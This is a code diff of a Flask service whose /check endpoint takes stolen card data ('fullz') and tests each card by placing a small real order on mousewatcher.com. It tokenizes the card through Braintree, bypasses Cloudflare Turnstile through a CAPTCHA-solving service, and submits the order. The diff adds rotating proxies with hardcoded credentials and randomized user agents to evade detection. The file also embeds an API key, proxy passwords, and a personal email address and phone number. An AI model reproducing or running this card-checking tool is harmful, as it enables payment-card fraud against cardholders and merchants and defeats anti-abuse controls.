@@ -6,12 +6,12 @@ import time
 import os
 import logging
 from datetime import datetime, timedelta
-import requests
+import httpx
+from fake_useragent import UserAgent
 
 app = Flask(__name__)
 
-# Setup logging
-LOG_FILE = '/tmp/requests_log.txt'  # Use /tmp for Vercel writeable directory
+LOG_FILE = '/tmp/requests_log.txt'
 
 logging.basicConfig(
     level=logging.INFO,
@@ -22,15 +22,25 @@ logging.basicConfig(
     ]
 )
 
+PROXY_URL = "http://gw.dataimpulse.com:823"
+PROXY_USER = "fefba219d9470e2f3e9f"
+PROXY_PASS = "7c4d77b9baa8a6eb"
+
+proxies = {
+    "http://": f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_URL}",
+    "https://": f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_URL}",
+}
+
+ua = UserAgent()
+
 def log_response(step, response, card_last4=""):
-    """Log response to file"""
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     log_entry = f"""
 {'='*60}
 [{timestamp}] STEP: {step} | CARD: {card_last4}
 {'='*60}
 STATUS: {response.status_code}
-URL: {response.url}
+URL: {str(response.url)}
 BODY: {response.text[:1000]}
 {'='*60}
 """
@@ -44,7 +54,6 @@ BODY: {response.text[:1000]}
 CAPSOLVER_API_KEY = os.environ.get('CAPSOLVER_API_KEY', 'CAP-36BF001B18A46AC00BC2C165F2D9CBAC993998A167516A0BC5543A6DD46464AF')
 
 def get_dates():
-    """Generate today's date and next 7 days"""
     today = datetime.now()
     dates = []
     for i in range(7):
@@ -53,7 +62,6 @@ def get_dates():
     return dates
 
 def solve_turnstile():
-    """Solve Cloudflare Turnstile using Capsolver API directly"""
     logging.info("Starting Turnstile solving...")
     
     create_payload = {
@@ -66,8 +74,9 @@ def solve_turnstile():
         }
     }
     
-    response = requests.post("https://api.capsolver.com/createTask", json=create_payload)
-    result = response.json()
+    with httpx.Client(proxies=proxies, timeout=30.0) as client:
+        response = client.post("https://api.capsolver.com/createTask", json=create_payload)
+        result = response.json()
     
     if result.get("errorId"):
         raise Exception(f"Task creation failed: {result.get('errorDescription', 'Unknown error')}")
@@ -81,8 +90,9 @@ def solve_turnstile():
             "clientKey": CAPSOLVER_API_KEY,
             "taskId": task_id
         }
-        response = requests.post("https://api.capsolver.com/getTaskResult", json=get_payload)
-        result = response.json()
+        with httpx.Client(proxies=proxies, timeout=30.0) as client:
+            response = client.post("https://api.capsolver.com/getTaskResult", json=get_payload)
+            result = response.json()
         
         if result.get("status") == "ready":
             token = result.get("solution", {}).get("token")
@@ -109,7 +119,6 @@ def home():
 
 @app.route('/date', methods=['GET'])
 def show_date():
-    """Show current date being used"""
     dates = get_dates()
     return jsonify({
         'today': datetime.now().strftime("%Y-%m-%d"),
@@ -119,7 +128,6 @@ def show_date():
 
 @app.route('/logs', methods=['GET'])
 def view_logs():
-    """View recent logs"""
     try:
         with open(LOG_FILE, 'r', encoding='utf-8') as f:
             lines = f.readlines()
@@ -130,7 +138,6 @@ def view_logs():
 
 @app.route('/check', methods=['GET', 'POST'])
 def check_card():
-    session = None
     try:
         if request.method == 'GET':
             fullz = request.args.get('cc')
@@ -148,157 +155,145 @@ def check_card():
         today_date = dates[0]
         
         logging.info(f"Processing card ending in {card_last4} for date {today_date}")
-        
-        session = requests.Session()
-        
-        # Chrome browser headers
-        chrome_headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.9',
-            #'Accept-Encoding': 'gzip, deflate, br',
-            'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-            'Sec-Ch-Ua-Mobile': '?0',
-            'Sec-Ch-Ua-Platform': '"Windows"',
-            'Sec-Fetch-Site': 'none',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-User': '?1',
-            'Sec-Fetch-Dest': 'document',
-            'Upgrade-Insecure-Requests': '1',
-        }
-        
-        # Step 1: Get CSRF token
-        response = session.get('https://mousewatcher.com', headers=chrome_headers)
-        
 
-with open('response.html', 'w', encoding='utf-8') as f:
-    f.write(response.text)
         
-        log_response("GET_CSRF_TOKEN", response, card_last4)
         
-        csrf_match = re.search(r'<meta name="csrf-token" content="([^"]+)"', response.text)
-        if not csrf_match:
-            raise Exception("CSRF token not found")
-        csrf_token = csrf_match.group(1)
-        logging.info(f"CSRF token obtained")
-        
-        # Step 2: Get totals
-        totals_headers = {
-            **chrome_headers,
-            'Accept': 'text/vnd.turbo-stream.html, text/html, application/xhtml+xml',
-            'Content-Type': 'application/json',
-            'X-Csrf-Token': csrf_token,
-            'X-Requested-With': 'XMLHttpRequest',
-            'Origin': 'https://mousewatcher.com',
-            'Referer': 'https://mousewatcher.com/',
-        }
-        
-        response = session.post('https://mousewatcher.com/orders/totals', headers=totals_headers, json={'dates': [today_date]})
-        log_response("POST_TOTALS", response, card_last4)
-        
-        # Step 3: Get Braintree token
-        token_headers = {
-            **chrome_headers,
-            'Referer': 'https://mousewatcher.com/',
-            'Accept': 'application/json',
-        }
-        
-        response = session.get('https://mousewatcher.com/orders/tokens', headers=token_headers)
-        log_response("GET_BRAINTREE_TOKEN", response, card_last4)
-        
-        if not response.text:
-            raise Exception("Empty response from tokens endpoint")
-        
-        jwt_token = response.json().get('braintree_token')
-        if not jwt_token:
-            raise Exception("Braintree token not found")
+        with httpx.Client(proxies=proxies, timeout=30.0, follow_redirects=True) as client:
+            chrome_headers = {
+                'User-Agent': ua.random,
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Origin': 'https://www.google.com',
+                'Referer': 'https://www.google.com/',
+                'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+                'Sec-Ch-Ua-Mobile': '?0',
+                'Sec-Ch-Ua-Platform': '"Windows"',
+                'Sec-Fetch-Site': 'cross-site',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-User': '?1',
+                'Sec-Fetch-Dest': 'document',
+                'Upgrade-Insecure-Requests': '1',
+            }
             
-        decoded = json.loads(base64.urlsafe_b64decode(jwt_token))
-        auth = decoded['authorizationFingerprint']
-        logging.info(f"Braintree auth obtained")
-        
-        # Step 4: Tokenize card
-        tokenize_headers = {
-            'User-Agent': chrome_headers['User-Agent'],
-            'Content-Type': 'application/json',
-            'Authorization': f'Bearer {auth}',
-            'Braintree-Version': '2018-05-10',
-            'Origin': 'https://assets.braintreegateway.com',
-            'Referer': 'https://assets.braintreegateway.com/',
-        }
-        
-        json_data = {
-            'clientSdkMetadata': {
-                'source': 'client',
-                'integration': 'dropin2',
-                'sessionId': '38cfe742-91d5-4963-be3c-825f72b84fec',
-            },
-            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear } } }',
-            'variables': {
-                'input': {
-                    'creditCard': {
-                        'number': cc,
-                        'expirationMonth': mes,
-                        'expirationYear': ano,
-                        'cvv': cvv,
-                        'billingAddress': {'postalCode': '10001'},
-                    },
-                    'options': {'validate': False},
+            response = client.get('https://mousewatcher.com', headers=chrome_headers)
+            log_response("GET_CSRF_TOKEN", response, card_last4)
+            
+            csrf_match = re.search(r'<meta name="csrf-token" content="([^"]+)"', response.text)
+            if not csrf_match:
+                raise Exception("CSRF token not found")
+            csrf_token = csrf_match.group(1)
+            logging.info(f"CSRF token obtained")
+            
+            totals_headers = {
+                **chrome_headers,
+                'Accept': 'text/vnd.turbo-stream.html, text/html, application/xhtml+xml',
+                'Content-Type': 'application/json',
+                'X-Csrf-Token': csrf_token,
+                'X-Requested-With': 'XMLHttpRequest',
+                'Origin': 'https://mousewatcher.com',
+                'Referer': 'https://mousewatcher.com/',
+            }
+            
+            response = client.post('https://mousewatcher.com/orders/totals', headers=totals_headers, json={'dates': [today_date]})
+            log_response("POST_TOTALS", response, card_last4)
+            
+            token_headers = {
+                **chrome_headers,
+                'Accept': 'application/json',
+                'Origin': 'https://mousewatcher.com',
+                'Referer': 'https://mousewatcher.com/',
+            }
+            
+            response = client.get('https://mousewatcher.com/orders/tokens', headers=token_headers)
+            log_response("GET_BRAINTREE_TOKEN", response, card_last4)
+            
+            if not response.text:
+                raise Exception("Empty response from tokens endpoint")
+            
+            jwt_token = response.json().get('braintree_token')
+            if not jwt_token:
+                raise Exception("Braintree token not found")
+                
+            decoded = json.loads(base64.urlsafe_b64decode(jwt_token))
+            auth = decoded['authorizationFingerprint']
+            logging.info(f"Braintree auth obtained")
+            
+            tokenize_headers = {
+                'User-Agent': chrome_headers['User-Agent'],
+                'Content-Type': 'application/json',
+                'Authorization': f'Bearer {auth}',
+                'Braintree-Version': '2018-05-10',
+                'Origin': 'https://assets.braintreegateway.com',
+                'Referer': 'https://assets.braintreegateway.com/',
+            }
+            
+            json_data = {
+                'clientSdkMetadata': {
+                    'source': 'client',
+                    'integration': 'dropin2',
+                    'sessionId': '38cfe742-91d5-4963-be3c-825f72b84fec',
                 },
-            },
-            'operationName': 'TokenizeCreditCard',
-        }
-        
-        response = requests.post('https://payments.braintree-api.com/graphql', headers=tokenize_headers, json=json_data)
-        log_response("TOKENIZE_CARD", response, card_last4)
-        
-        response_json = response.json()
-        if 'data' not in response_json or not response_json['data'].get('tokenizeCreditCard'):
-            error_msg = response_json.get('errors', [{}])[0].get('message', 'Unknown error')
-            raise Exception(f"Tokenization failed: {error_msg}")
-        
-        tkn = response_json['data']['tokenizeCreditCard']['token']
-        logging.info(f"Card tokenized successfully")
-        
-        # Step 5: Solve Turnstile
-        turnstile_token = solve_turnstile()
-        
-        # Step 6: Submit order
-        post_data = f'authenticity_token={csrf_token}&park=1&order[alert][restaurant_id]=297&order%5Balert%5D%5Balert_dates_attributes%5D%5B0%5D%5Bid%5D&order[alert][alert_dates_attributes][0][_destroy]=false&order[alert][alert_dates_attributes][0][date]={today_date}&order[alert][alert_dates_attributes][0][breakfast]=0&order[alert][alert_dates_attributes][0][lunch]=0&order[alert][alert_dates_attributes][0][dinner]=0&order[alert][alert_dates_attributes][0][dinner]=1&order[alert][alert_dates_attributes][0][dinner_has_range]=0&order[alert][alert_dates_attributes][0][dinner_party_size]=1&order%5Balert%5D%5Balert_dates_attributes%5D%5B1%5D%5Bid%5D&order[alert][alert_dates_attributes][1][_destroy]=false&order%5Balert%5D%5Balert_dates_attributes%5D%5B2%5D%5Bid%5D&order[alert][alert_dates_attributes][2][_destroy]=false&order[alert][email]=opdevildragon%40gmail.com&alert_phone=%28201%29+245-5464&order[alert][phone]=%2B12012455464&cf-turnstile-response={turnstile_token}&payment_nonce={tkn}&device_data=%7B%22correlation_id%22%3A%2238cfe742-91d5-4963-be3c-825f72b8%22%7D'
-        
-        submit_headers = {
-            **chrome_headers,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://mousewatcher.com',
-            'Referer': 'https://mousewatcher.com/',
-        }
-        
-        response = session.post('https://mousewatcher.com/orders', headers=submit_headers, data=post_data)
-        log_response("SUBMIT_ORDER", response, card_last4)
-        
-        # Check result
-        if '<div id="error_explanation">' in response.text:
-            error_match = re.search(r'<label class="error">\s*(.*?)\s*</label>', response.text, re.DOTALL)
-            error = error_match.group(1).strip() if error_match else 'Unknown error'
-            logging.warning(f"Order failed: {error}")
-            return jsonify({'status': 'failed', 'error': error, 'card': card_last4, 'date_used': today_date}), 200
-        
-        logging.info(f"SUCCESS! Card {card_last4} processed")
-        return jsonify({
-            'status': 'success',
-            'message': 'Order placed successfully',
-            'card': card_last4,
-            'date_used': today_date,
-            'token': tkn
-        }), 200
+                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear } } }',
+                'variables': {
+                    'input': {
+                        'creditCard': {
+                            'number': cc,
+                            'expirationMonth': mes,
+                            'expirationYear': ano,
+                            'cvv': cvv,
+                            'billingAddress': {'postalCode': '10001'},
+                        },
+                        'options': {'validate': False},
+                    },
+                },
+                'operationName': 'TokenizeCreditCard',
+            }
+            
+            response = client.post('https://payments.braintree-api.com/graphql', headers=tokenize_headers, json=json_data)
+            log_response("TOKENIZE_CARD", response, card_last4)
+            
+            response_json = response.json()
+            if 'data' not in response_json or not response_json['data'].get('tokenizeCreditCard'):
+                error_msg = response_json.get('errors', [{}])[0].get('message', 'Unknown error')
+                raise Exception(f"Tokenization failed: {error_msg}")
+            
+            tkn = response_json['data']['tokenizeCreditCard']['token']
+            logging.info(f"Card tokenized successfully")
+            
+            turnstile_token = solve_turnstile()
+            
+            post_data = f'authenticity_token={csrf_token}&park=1&order[alert][restaurant_id]=297&order%5Balert%5D%5Balert_dates_attributes%5D%5B0%5D%5Bid%5D&order[alert][alert_dates_attributes][0][_destroy]=false&order[alert][alert_dates_attributes][0][date]={today_date}&order[alert][alert_dates_attributes][0][breakfast]=0&order[alert][alert_dates_attributes][0][lunch]=0&order[alert][alert_dates_attributes][0][dinner]=0&order[alert][alert_dates_attributes][0][dinner]=1&order[alert][alert_dates_attributes][0][dinner_has_range]=0&order[alert][alert_dates_attributes][0][dinner_party_size]=1&order%5Balert%5D%5Balert_dates_attributes%5D%5B1%5D%5Bid%5D&order[alert][alert_dates_attributes][1][_destroy]=false&order%5Balert%5D%5Balert_dates_attributes%5D%5B2%5D%5Bid%5D&order[alert][alert_dates_attributes][2][_destroy]=false&order[alert][email]=opdevildragon%40gmail.com&alert_phone=%28201%29+245-5464&order[alert][phone]=%2B12012455464&cf-turnstile-response={turnstile_token}&payment_nonce={tkn}&device_data=%7B%22correlation_id%22%3A%2238cfe742-91d5-4963-be3c-825f72b8%22%7D'
+            
+            submit_headers = {
+                **chrome_headers,
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Origin': 'https://mousewatcher.com',
+                'Referer': 'https://mousewatcher.com/',
+            }
+            
+            response = client.post('https://mousewatcher.com/orders', headers=submit_headers, data=post_data)
+            log_response("SUBMIT_ORDER", response, card_last4)
+            
+            if '<div id="error_explanation">' in response.text:
+                error_match = re.search(r'<label class="error">\s*(.*?)\s*</label>', response.text, re.DOTALL)
+                error = error_match.group(1).strip() if error_match else 'Unknown error'
+                logging.warning(f"Order failed: {error}")
+                return jsonify({'status': 'failed', 'error': error, 'card': card_last4, 'date_used': today_date}), 200
+            
+            logging.info(f"SUCCESS! Card {card_last4} processed")
+            return jsonify({
+                'status': 'success',
+                'message': 'Order placed successfully',
+                'card': card_last4,
+                'date_used': today_date,
+                'token': tkn
+            }), 200
         
     except Exception as e:
         logging.error(f"Error: {str(e)}")
         return jsonify({'error': str(e)}), 500
-    finally:
-        if session:
-            session.close()
 
 if __name__ == '__main__':
     app.run(debug=True)
